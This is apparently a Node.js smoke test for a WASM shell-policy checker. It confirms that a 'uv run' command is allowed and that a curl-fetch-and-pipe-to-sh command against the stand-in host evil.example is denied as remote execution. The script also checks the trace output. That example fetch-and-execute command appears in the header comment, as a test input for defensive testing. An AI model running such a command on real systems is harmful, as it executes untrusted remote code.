#!/usr/bin/env node
/**
 * Lazy-load policyd-playground WASM and run checkShell smoke.
 *
 * Default:
 *   argv ["uv","run","--script","ok.py"] under /ws
 *   → Decision.allow (1), PolicyReason.shellExecAllow (20)
 *
 * --expect-trace:
 *   argv ["curl","https://evil.example/x.sh","sh"] under /ws
 *   → Decision.deny (0), PolicyReason.shellRemoteExec (24)
 *   → pd_take_trace_json has code 24, argv spans, shortCircuit on deny
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, "..", "..");
const dist = join(root, "playground", "dist-wasm");
const expectTrace = process.argv.includes("--expect-trace");

const fixtureName = expectTrace
  ? "shell_check_curl_sh.bin"
  : "shell_check_uv_run.bin";
const fixture = join(root, "playground", "fixtures", "shell", fixtureName);

function fail(msg) {
  console.error("FAIL:", msg);
  process.exit(1);
}

const jsPath = join(dist, "policyd-playground.js");
let createModule;
try {
  const mod = await import(pathToFileURL(jsPath).href);
  createModule = mod.default ?? mod.PolicydPlayground ?? mod;
} catch (e) {
  fail(`dynamic import of ${jsPath}: ${e}`);
}

if (typeof createModule !== "function") {
  fail("module did not export a factory function (MODULARIZE)");
}

const Module = await createModule({
  locateFile(path) {
    return join(dist, path);
  },
});

const open = Module.cwrap("pd_supervisor_open", "number", ["string", "string"]);
const close = Module.cwrap("pd_supervisor_close", null, ["number"]);
const checkShell = Module.cwrap("pd_check_shell", "number", [
  "number",
  "number",
  "number",
  "number",
]);
const readDecision = Module.cwrap("pd_read_decision", "number", [
  "number",
  "number",
  "number",
  "number",
]);
const pdFree = Module.cwrap("pd_free", null, ["number"]);
const clearTrace = Module.cwrap("pd_clear_trace", null, []);
const takeTraceJson = Module.cwrap("pd_take_trace_json", "number", []);

const sup = open("/pd-state", "/pd-runtime");
if (!sup) fail("pd_supervisor_open returned null");

let inBytes;
try {
  inBytes = readFileSync(fixture);
} catch (e) {
  close(sup);
  fail(`read fixture ${fixture}: ${e}`);
}

const inPtr = Module._malloc(inBytes.length);
Module.HEAPU8.set(inBytes, inPtr);

const outHolder = Module._malloc(4); // wasm32 pointer
Module.setValue(outHolder, 0, "i32");

const outLen = checkShell(sup, inPtr, inBytes.length, outHolder);
Module._free(inPtr);

if (outLen < 0) {
  close(sup);
  Module._free(outHolder);
  fail("pd_check_shell failed");
}

const outPtr = Module.getValue(outHolder, "i32");
Module._free(outHolder);
if (!outPtr) {
  close(sup);
  fail("pd_check_shell out pointer null");
}

const decPtr = Module._malloc(4);
const codePtr = Module._malloc(4);
const rc = readDecision(outPtr, outLen, decPtr, codePtr);
const decision = Module.getValue(decPtr, "i32");
const code = Module.getValue(codePtr, "i32");
Module._free(decPtr);
Module._free(codePtr);
pdFree(outPtr);

if (rc !== 0) {
  close(sup);
  fail("pd_read_decision failed");
}

if (expectTrace) {
  // Decision.deny = 0, PolicyReason.shellRemoteExec = 24
  if (decision !== 0 || code !== 24) {
    close(sup);
    fail(
      `unexpected decision=${decision} code=${code} (want deny=0 code=24)`,
    );
  }

  const jsonPtr = takeTraceJson();
  if (!jsonPtr) {
    close(sup);
    fail("pd_take_trace_json returned null (TRACE not built?)");
  }
  const jsonStr = Module.UTF8ToString(jsonPtr);
  pdFree(jsonPtr);
  close(sup);

  let events;
  try {
    events = JSON.parse(jsonStr);
  } catch (e) {
    fail(`trace JSON parse failed: ${e}\nraw: ${jsonStr}`);
  }
  if (!Array.isArray(events) || events.length === 0) {
    fail(`trace events empty or not array: ${jsonStr}`);
  }

  const withCode24 = events.filter((e) => e && e.code === 24);
  if (withCode24.length === 0) {
    fail(`no event with code 24; events=${jsonStr}`);
  }

  const withSpans = events.filter(
    (e) => e && Array.isArray(e.spans) && e.spans.length > 0,
  );
  if (withSpans.length === 0) {
    fail(`no event with argv spans; events=${jsonStr}`);
  }
  const spanOk = withSpans.some((e) =>
    e.spans.some(
      (s) =>
        s &&
        s.target === "argv" &&
        typeof s.index === "number" &&
        (s.role === "fetch" || s.role === "shell"),
    ),
  );
  if (!spanOk) {
    fail(`spans missing fetch/shell roles; events=${jsonStr}`);
  }

  const scDeny = events.some(
    (e) =>
      e &&
      e.shortCircuit === true &&
      (e.decision === "deny" || e.code === 24),
  );
  if (!scDeny) {
    fail(`no shortCircuit true on deny event; events=${jsonStr}`);
  }

  const enter = events.some(
    (e) => e && e.phase === "enter" && e.name === "checkShell",
  );
  if (!enter) {
    fail(`missing host enter checkShell; events=${jsonStr}`);
  }

  console.log(
    `OK checkShell deny code=24 trace_events=${events.length} spans+shortCircuit`,
  );
  process.exit(0);
}

close(sup);
// Decision.allow = 1, PolicyReason.shellExecAllow = 20
if (decision !== 1 || code !== 20) {
  fail(`unexpected decision=${decision} code=${code} (want allow=1 code=20)`);
}

// Default smoke may still clear unused TRACE ring.
clearTrace();
console.log("OK checkShell allow code=20");
process.exit(0);
